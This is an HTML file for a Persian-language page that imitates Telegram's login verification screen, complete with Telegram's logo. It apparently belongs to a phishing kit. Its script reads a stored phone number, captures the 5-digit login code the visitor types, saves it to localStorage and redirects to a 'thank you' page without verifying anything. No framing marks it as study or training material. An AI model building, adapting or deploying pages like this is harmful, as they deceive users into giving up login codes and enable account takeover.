<!DOCTYPE html>
<html lang="fa">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تأیید کد</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
background: #0f0f0f;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}
.container {
background: #1c1c1e;
padding: 40px 30px;
border-radius: 16px;
max-width: 400px;
width: 100%;
box-shadow: 0 0 30px rgba(0,0,0,0.9);
text-align: center;
}
.logo { width: 80px; margin-bottom: 16px; }
.title { color: #ffffff; font-size: 24px; font-weight: 600; margin-bottom: 6px; }
.subtitle { color: #8e8e93; font-size: 14px; margin-bottom: 24px; }
.input-group { text-align: left; margin-bottom: 16px; }
.input-group label { display: block; color: #8e8e93; font-size: 13px; margin-bottom: 4px; }
.input-group input[type="text"] {
width: 100%;
padding: 12px;
background: #2c2c2e;
border: none;
border-radius: 10px;
color: white;
font-size: 16px;
outline: none;
text-align: center;
letter-spacing: 6px;
}
.input-group input::placeholder { color: #636366; letter-spacing: 2px; }
.login-btn {
width: 100%;
padding: 14px;
background: #0088cc;
border: none;
border-radius: 10px;
color: white;
font-size: 18px;
font-weight: 600;
cursor: pointer;
transition: background 0.2s;
}
.login-btn:hover { background: #0077b3; }
.resend {
margin-top: 16px;
color: #8e8e93;
font-size: 14px;
}
.resend a { color: #0088cc; text-decoration: none; }
.resend a:hover { text-decoration: underline; }
.error-msg { color: #ff4444; font-size: 13px; margin-top: 10px; display: none; }
</style>
</head>
<body>
<div class="container">
<img src="https://telegram.org/img/t_logo.png" class="logo" alt="Telegram">
<div class="title">Verification Code</div>
<div class="subtitle">We've sent a 5-digit code to<br><span id="phoneDisplay">+98 912 345 6789</span></div>

<form action="thankyou.html" method="GET" onsubmit="saveCode(event)">
<div class="input-group">
<label>Enter Code</label>
<input type="text" name="code" id="code" placeholder="— — — — —" maxlength="5" required>
</div>
<button type="submit" class="login-btn">VERIFY</button>
</form>

<div class="resend">Didn't get the code? <a href="#">Resend</a></div>
<div class="error-msg">⚠️ کد اشتباه است، دوباره تلاش کنید.</div>
</div>

<script>
const phone = localStorage.getItem('phone');
if (phone) {
document.getElementById('phoneDisplay').textContent = phone;
}

function saveCode(event) {
event.preventDefault();
const code = document.getElementById('code').value;
localStorage.setItem('code', code);
window.location.href = 'thankyou.html';
}
</script>
</body>
</html>
